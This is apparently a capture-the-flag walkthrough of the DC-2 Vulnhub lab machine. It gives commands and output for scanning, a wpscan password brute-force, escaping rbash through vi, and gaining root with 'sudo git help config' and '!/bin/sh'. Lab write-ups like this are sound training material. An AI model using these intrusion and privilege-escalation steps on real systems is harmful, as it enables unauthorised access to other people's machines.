# DC-2: Vulnhub Walkthrough

***Description:***

*DC-2 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.*

*There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.*

*Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.*

## Scanning

nmap 192.168.122.185

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled.png)

nmap -p- 192.168.122.185

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%201.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%201.png)

nmap -sV -A -p 80,7744 192.168.122.185 (*Service version scan)*

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%202.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%202.png)

nmap -sV -A --script vuln -p 80,7744 192.168.122.185 (*Vulnerability Scanning)*

```jsx
root@kali:~# nmap -sV -A --script vuln -p 80,7744 192.168.122.185
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-05-27 13:36 EDT
Nmap scan report for 192.168.122.185
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: tom
| Username found: jerry
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
| vulners: 
|   cpe:/a:apache:http_server:2.4.10: 
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-2161	5.0	https://vulners.com/cve/CVE-2016-2161
|     	CVE-2016-0736	5.0	https://vulners.com/cve/CVE-2016-0736
|     	CVE-2015-3183	5.0	https://vulners.com/cve/CVE-2015-3183
|     	CVE-2015-0228	5.0	https://vulners.com/cve/CVE-2015-0228
|     	CVE-2014-3583	5.0	https://vulners.com/cve/CVE-2014-3583
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573*EXPLOIT*
|     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2015-3185	4.3	https://vulners.com/cve/CVE-2015-3185
|     	CVE-2014-8109	4.3	https://vulners.com/cve/CVE-2014-8109
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265	*EXPLOIT*
|     	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40961	0.0	https://vulners.com/exploitdb/EDB-ID:40961	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
|     	1337DAY-ID-1415	0.0	https://vulners.com/zdt/1337DAY-ID-1415	*EXPLOIT*
|_    	1337DAY-ID-1161	0.0	https://vulners.com/zdt/1337DAY-ID-1161	*EXPLOIT*
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.7p1: 
|     	EDB-ID:21018	10.0	https://vulners.com/exploitdb/EDB-ID:21018	*EXPLOIT*
|     	CVE-2001-0554	10.0	https://vulners.com/cve/CVE-2001-0554
|     	CVE-2015-5600	8.5	https://vulners.com/cve/CVE-2015-5600
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2020-16088	7.5	https://vulners.com/cve/CVE-2020-16088
|     	EDB-ID:41173	7.2	https://vulners.com/exploitdb/EDB-ID:41173	*EXPLOIT*
|     	CVE-2015-6564	6.9	https://vulners.com/cve/CVE-2015-6564
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	SSV:90447	4.6	https://vulners.com/seebug/SSV:90447	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:45210	4.6	https://vulners.com/exploitdb/EDB-ID:45210	*EXPLOIT*
|     	EDB-ID:45001	4.6	https://vulners.com/exploitdb/EDB-ID:45001	*EXPLOIT*
|     	EDB-ID:45000	4.6	https://vulners.com/exploitdb/EDB-ID:45000	*EXPLOIT*
|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
|     	CVE-2016-0778	4.6	https://vulners.com/cve/CVE-2016-0778
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2015-5352	4.3	https://vulners.com/cve/CVE-2015-5352
|     	CVE-2016-0777	4.0	https://vulners.com/cve/CVE-2016-0777
|_    	CVE-2015-6563	1.9	https://vulners.com/cve/CVE-2015-6563
MAC Address: 00:0C:29:21:82:2C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.10 ms 192.168.122.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.19 seconds
root@kali:~# 
```

*Add 192.168.122.185 in /etc/hosts*

*nano /etc/hosts*

*192.168.122.185 dc-2*

nikto -h http://dc-2/

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%203.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%203.png)

## Enumeration

*Open [http://dc-2/](http://dc-2/) in browser.*

*Found Flag in http://dc-2/index.php/flag/*

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%204.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%204.png)

*In flag1 there is hint to make wordlist using cewl*

cewl -w dc2.txt http://dc-2/

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%205.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%205.png)

wpscan --url http://dc-2/ -w /root/dc2.txt *(Using wpscan to enumerate wordpress user and bruteforce password)* 

```jsx
root@kali:~# wpscan --url http://dc-2/ -w /root/dc2.txt 
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time
[i] Last database update: 2018-08-21
[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
[+] URL: http://dc-2/
[+] Started: Thu May 27 14:04:47 2021

[+] Interesting header: LINK: <http://dc-2/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: LINK: <http://dc-2/>; rel=shortlink
[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
[+] XML-RPC Interface available under: http://dc-2/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://dc-2/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+-------+
| Name  |
+-------+
| admin |
+-------+
[!] Includes directory has directory listing enabled: http://dc-2/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 4.7.10 (Released on 2018-04-03) identified from meta generator, links opml
[!] 1 vulnerability identified from the version number

[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
    Reference: https://wpvulndb.com/vulnerabilities/9100
    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
[i] Fixed in: 4.7.11

[+] WordPress theme in use: twentyseventeen - v1.2

[+] Name: twentyseventeen - v1.2
 |  Last updated: 2018-08-02T00:00:00.000Z
 |  Location: http://dc-2/wp-content/themes/twentyseventeen/
 |  Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.7
 |  Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found passively

[+] Enumerating usernames ...
[+] We identified the following 3 users:
    +----+-------+-------------+
    | ID | Login | Name        |
    +----+-------+-------------+
    | 1  | admin | admin       |
    | 2  | tom   | Tom Cat     |
    | 3  | jerry | Jerry Mouse |
    +----+-------+-------------+
[!] Default first WordPress username 'admin' is still used
[+] Starting the password brute forcer
  Brute Forcing 'admin' Time: 00:00:38 <=================================================================== > (714 / 715) 99.86%  ETA: 00:00:00
  [+] [SUCCESS] Login : tom Password : parturient                                                                                              

  [+] [SUCCESS] Login : jerry Password : adipiscing                                                                                            

  Brute Forcing 'jerry' Time: 00:00:10 <=================                                                   > (181 / 715) 25.31%  ETA: 00:00:32
  +----+-------+-------------+------------+
  | ID | Login | Name        | Password   |
  +----+-------+-------------+------------+
  | 1  | admin | admin       |            |
  | 2  | tom   | Tom Cat     | parturient |
  | 3  | jerry | Jerry Mouse | adipiscing |
  +----+-------+-------------+------------+

[+] Finished: Thu May 27 14:05:52 2021
[+] Elapsed time: 00:01:04
[+] Requests made: 1530
[+] Memory used: 20.09 MB
root@kali:~#
```

*Found Login and password*

*Login in [http://dc-2/wp-login.php](http://dc-2/wp-login.php) with user jerry and password adipiscing* 

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%206.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%206.png)

*Found flag2. Flag2 is giving hint about another entry point.*

## Exploitation

ssh tom@192.168.122.185 -p 7744

*Password: parturient* 

id

cd 

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%207.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%207.png)

*We got ssh shell but it is using rbash so first we need to escape rbash*

vi

:set shell=/bin/bash 

:shell

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%208.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%208.png)

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%209.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%209.png)

export PATH=/bin:/usr/bin:$PATH

export SHELL=/bin/bash:$SHELL

id

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2010.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2010.png)

ls (*Found flag3.txt)*

cat flag3.txt

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2011.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2011.png)

su jerry

*password: adipiscing* 

id

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2012.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2012.png)

ls *(Found flag4.txt)*

cat flag4.txt

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2013.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2013.png)

## Privilege escalation

sudo -l

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2014.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2014.png)

sudo git help config

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2015.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2015.png)

!/bin/sh

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2016.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2016.png)

*We got root shell*

id

whoami

/bin/bash

ls *(Found final-flag.txt)*

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2017.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2017.png)

cat final-flag.txt

![DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2018.png](DC%202%208bb533798f654b0da4c7877bde040ba6/Untitled%2018.png)
